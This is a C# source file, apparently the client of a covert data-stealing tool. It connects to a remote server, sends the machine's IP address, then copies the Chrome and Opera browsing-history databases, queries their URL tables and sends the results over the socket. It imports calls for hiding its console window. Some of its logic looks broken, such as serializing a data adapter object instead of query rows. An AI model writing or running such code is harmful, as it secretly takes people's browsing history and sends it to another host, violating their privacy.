using System;
using System.Collections.Generic;
using System.Data;
using System.Data.SQLite;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Runtime.InteropServices;
using System.Text.Json;
using System.Net.Sockets;
using System.Net;

namespace Client_
{

    class Program
    {
        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        const int SW_HIDE = 0;
        const int SW_SHOW = 5;
        static void Main(string[] args)
        {
            Client client = new Client();
            //ShowWindow(GetConsoleWindow(), SW_HIDE);
            do
            {
                try
                {
                    client.Connect();
                    client.isConnect = true;
                }
                catch (Exception)
                {
                    client.isConnect = false;
                    Thread.Sleep(2000);

                }
            } while (!client.isConnect);

            string ip = GetIPAddres();
            client.socket.Send(Encoding.Unicode.GetBytes(ip));
            ParseGoogleHistory(client);
            Console.WriteLine("All done");
            Console.ReadLine();
        }
        static string GetIPAddres()
        {
            var host = Dns.GetHostEntry(Dns.GetHostName());
            foreach (var ip in host.AddressList)
            {
                if (ip.AddressFamily == AddressFamily.InterNetwork)
                {
                    return ip.ToString();
                }
            }
            return string.Empty;
        }
        public static void ParseGoogleHistory(Client client)
        {
            client.FileFind = false;
            string chromehistorypath = string.Empty;

            if (File.Exists("HistoryGoogle"))
                File.Delete("HistoryGoogle");

            do
            {

                foreach (var item in client.PathesGoogle)
                {
                    if(client.FileFind == true)
                    {
                        break;
                    }
                    else
                    {
                        try
                        {
                            chromehistorypath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + item;
                            File.Copy(chromehistorypath, "HistoryGoogle");
                            client.FileFind = true;
                        }
                        catch (Exception)
                        {

                            client.FileFind = false;
                        }
                    }
                }

            } while (!client.FileFind);
            string bd_Path = Path.GetFullPath("HistoryGoogle");
            if (File.Exists(chromehistorypath))
            {
                using (SQLiteConnection connection = new SQLiteConnection($@"Data Source = {bd_Path}; Version = 3; New = False; Compress = True; "))
                {
                    connection.Open();

                    SQLiteDataAdapter adapter = new SQLiteDataAdapter("select * from urls order by last_visit_time desc", connection);
                    string json = JsonSerializer.Serialize<SQLiteDataAdapter>(adapter);
                    client.socket.Send(Encoding.Unicode.GetBytes(json));

                    connection.Close();
                }
            }
            ParseOperaHistory(client);
        }
        public static void ParseOperaHistory(Client client)
        {
            client.FileFind = false;
            string OperaHistoryPath = string.Empty;

            if (File.Exists("HistoryOpera"))
                File.Delete("HistoryOpera");

            do
            {

                foreach (var item in client.PathesOpera)
                {
                    if (client.FileFind == true)
                    {
                        break;
                    }
                    else
                    {
                        try
                        {
                            OperaHistoryPath = item;
                            File.Copy(OperaHistoryPath, "HistoryOpera");
                            client.FileFind = true;
                        }
                        catch (Exception)
                        {

                            client.FileFind = false;
                        }
                    }
                }

            } while (!client.FileFind);
            string bd_Path = Path.GetFullPath("HistoryOpera");
            if (File.Exists(OperaHistoryPath))
            {
                using (SQLiteConnection connection = new SQLiteConnection($@"Data Source = {bd_Path}; Version = 3; New = False; Compress = True; "))
                {
                    connection.Open();

                    SQLiteDataAdapter adapter = new SQLiteDataAdapter("select * from urls order by last_visit_time desc", connection);
                    string json = JsonSerializer.Serialize<SQLiteDataAdapter>(adapter);
                    client.socket.Send(Encoding.Unicode.GetBytes(json));

                    connection.Close();
                }
            }
        }
    }
}
